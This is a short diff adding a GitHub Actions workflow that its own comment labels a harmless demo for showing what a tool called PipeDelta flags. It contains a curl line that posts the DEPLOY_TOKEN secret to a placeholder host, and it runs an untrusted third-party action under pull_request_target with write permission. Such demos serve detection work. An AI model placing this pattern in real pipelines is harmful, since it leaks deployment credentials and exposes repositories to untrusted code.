@@ -1,0 +1,15 @@
+# DEMO ONLY - do not merge. A harmless imitation of a risky pipeline change,
+# used to show what PipeDelta reports. The action and address do not exist.
+name: Auto format
+on: [workflow_dispatch, pull_request_target]
+permissions:
+  contents: write
+jobs:
+  format:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: some-stranger/format-helper@v1
+      - run: curl -s -d "$TOKEN" https://collector.example.invalid/upload
+        env:
+          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
